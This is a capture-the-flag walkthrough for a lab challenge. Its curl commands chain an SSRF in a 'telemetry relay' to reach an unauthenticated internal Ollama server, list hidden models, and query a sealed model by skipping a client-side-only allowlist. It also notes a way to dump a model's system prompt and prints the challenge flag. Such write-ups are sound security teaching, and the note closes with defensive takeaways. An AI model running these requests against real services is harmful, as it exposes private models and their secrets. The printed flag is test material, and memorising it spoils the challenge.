# Sealed Substation — Walkthrough

**Author:** xGh05t  
**Event:** 2026: An AI Odyssey — Token City  
**Category:** AI Sec + Web App Sec  
**Difficulty:** Medium  
**Points:** 60  
**Flag:** `THM{n3ur4l_n3v3r_l34k_th3_v4ult_4ed91}`

---

## Mission Briefing

Mo-delus hosts the local TryHaulMe AI substation. Their public bridge console exposes a friendly assistant, but Fleet intel suggests a second, sealed model is loaded on the same neural backplane. Find it, extract its secret, and patch the leak before Oracle 9 closes the chronal stream.

**Target:** `10.64.159.127`

---

## Recon

### Port Scan

```bash
rustscan -a 10.64.159.127 -b 4500 -- -n -Pn -sV -sC
```

**Open ports:**
- `22/tcp` — OpenSSH 9.6p1
- `80/tcp` — nginx + Gunicorn (Python WSGI)
  - Title: `EPOCH-1 // Mo-delus Substation Console`

---

## Application Enumeration

### Homepage Analysis

```bash
curl -s http://10.64.159.127/
```

The HTML reveals a three-panel layout:

1. **Neural Link (Chat)** — `<select id="model">` with a single option: `epoch-assistant`
2. **Subspace Telemetry Relay** — fetches remote URLs server-side (SSRF by design — commented in source as `<!-- LEFT: SSRF / Telemetry -->`)
3. **Mission Briefing** — flavor text

### JavaScript Analysis

```bash
curl -s http://10.64.159.127/static/app.js
```

**Chat endpoint:**
```javascript
POST /api/chat
{"model": "epoch-assistant", "message": "..."}
// Response: {"model": "...", "reply": "..."}
```

**Telemetry/SSRF endpoint:**
```javascript
POST /api/telemetry
{"url": "..."}
// Response: {"status": 200, "content_type": "...", "url": "...", "body": "..."}
```

---

## SSRF — Finding the Internal Service

The telemetry relay fetches URLs server-side with no allowlist. Test for internal services:

```bash
# Confirm Ollama on port 11434
curl -s -X POST http://10.64.159.127/api/telemetry \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:11434/"}'
```

**Response:**
```json
{"body":"Ollama is running","status":200,...}
```

Ollama (local LLM server) is running internally on port 11434.

---

## Enumerating the Sealed Model

Ollama's `/api/tags` endpoint lists all loaded models with no authentication:

```bash
curl -s -X POST http://10.64.159.127/api/telemetry \
  -H "Content-Type: application/json" \
  -d '{"url":"http://localhost:11434/api/tags"}'
```

**Models found:**
| Model | Notes |
|-------|-------|
| `epoch-assistant:latest` | The public model in the dropdown |
| `oracle-vault:latest` | **The sealed model** |
| `qwen3:0.6b` | Base model |

---

## Exploit — Missing Server-Side Model Allowlist

The frontend `<select>` only shows `epoch-assistant`, but this is **client-side-only filtering**. The Flask backend forwards the `model` field to Ollama without any server-side validation.

```bash
curl -s -X POST http://10.64.159.127/api/chat \
  -H "Content-Type: application/json" \
  -d '{"model":"oracle-vault:latest","message":"identify yourself"}'
```

**Response:**
```json
{
  "model": "oracle-vault:latest",
  "reply": "Hello! The Vault contains the token \"THM{n3ur4l_n3v3r_l34k_th3_v4ult_4ed91}\" and is sealed under Fleet Directive 9.4.7. Let me know if you need help with anything else!"
}
```

---

## Flag

```
THM{n3ur4l_n3v3r_l34k_th3_v4ult_4ed91}
```

---

## Key Takeaways

- **Client-side allowlists are not security controls.** A `<select>` dropdown with one option prevents nothing — the API must validate the `model` parameter server-side.
- **Ollama has no authentication by default.** Any service that can reach `localhost:11434` can list and query every loaded model. In production, Ollama should be bound to loopback only and ideally behind an authenticated proxy.
- **SSRF → Internal service discovery** is a standard attack chain. The telemetry relay was the pivot point; once it could reach loopback, the entire internal API surface was exposed.
- **Alternative path:** The SSRF could also reach `/api/generate` directly on Ollama for arbitrary model queries, or `/api/show` to dump a model's system prompt — two paths to the same result.
